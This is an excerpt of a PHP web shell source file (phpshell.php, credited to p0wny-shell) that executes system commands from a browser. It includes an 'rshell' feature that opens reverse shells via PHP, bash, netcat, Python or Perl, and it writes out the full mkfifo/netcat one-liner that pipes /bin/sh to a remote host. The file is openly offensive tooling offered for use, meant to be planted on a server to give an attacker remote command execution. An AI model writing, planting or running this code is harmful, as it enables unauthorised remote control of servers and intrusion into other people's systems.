...
/*
 * @file            : phpshell.php
 * @description     : Lightweight PHP script for executing system commands via a web interface.
 * @credits         : flozz/p0wny-shell
 */
...
function featureShell($cmd, $cwd) {
    ...
    } elseif (preg_match("/^\s*ll\s*(.*?)\s*(2>&1)?$/", $cmd, $matches)) {
        chdir($cwd);
        $args = trim($matches[1]);
        $cmd = "ls -Al" . ($args ? " $args" : "");
        $stdout = executeCommand($cmd);
    } elseif (preg_match("/^\s*rshell\s*$/", $cmd)) {
        // Show help when just 'rshell' is entered
        $stdout = createReverseShell();
    } elseif (preg_match("/^\s*rshell\s+(.*?)\s*(2>&1)?$/", $cmd, $matches)) {
        chdir($cwd);
        $args = trim($matches[1]);
        // Show usage if no arguments provided
        if (empty($args)) {
            $stdout = "Reverse Shell Usage:\n"
                    . "rshell <method> <ip>:<port>\n\n"
                    . "Example: \nrshell bash 192.168.1.100:8080";
        } 
        // Check if two arguments are provided (method and ip:port)
        elseif (preg_match("/^(\w+)\s+([\w.]+):(\d+)$/", $args, $arg_matches)) {
            $method = strtolower($arg_matches[1]);
            $ip = $arg_matches[2];
            $port = $arg_matches[3];
            $stdout = createReverseShell($ip, $port, $method);
        } else {
            $stdout = "Invalid format. Usage: rshell <method> <ip>:<port>\n\n"
                    . "Example:\nrshell bash 192.168.1.100:8080";
        }
    } else {
        chdir($cwd);
...
function createReverseShell($ip, $port, $method = 'php') {
    $result = "";
    $methods = [
        'php' => function($ip, $port) {
            ...
            if ($sock) {
                ...
                fclose($sock);
                return "Reverse shell connected to $ip:$port using PHP";
            }
            return false;
        },
        'bash' => function($ip, $port) {
            ...
            exec($cmd, $output, $ret);
            return ($ret === 0) ? "Reverse shell connected to $ip:$port using bash" : false;
        },
        'nc' => function($ip, $port) {
            $cmd = "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f 2>/dev/null";
            exec($cmd, $output, $ret);
            if ($ret === 0) return "Reverse shell connected to $ip:$port using netcat";
        },
        'python3' => function($ip, $port) {
            ...
            exec($cmd, $output, $ret);
            return ($ret === 0) ? "Reverse shell connected to $ip:$port using python" : false;
        },
        'perl' => function($ip, $port) {
            ...
            exec($cmd, $output, $ret);
            return ($ret === 0) ? "Reverse shell connected to $ip:$port using perl" : false;
        }
    ];

    if (!isset($methods[$method])) {
        $available = implode(', ', array_keys($methods));
        return "Invalid method: '$method'\n\n"
            .  "Available methods: $available";
    }

    $output = $methods[$method]($ip, $port);
    return $output ?: "Failed to create reverse shell using $method";
}
...
<html>
    ...
    <head>
        ...
        <link rel="shortcut icon" href="https://img.icons8.com/stickers/100/console.png" type="image/x-icon">
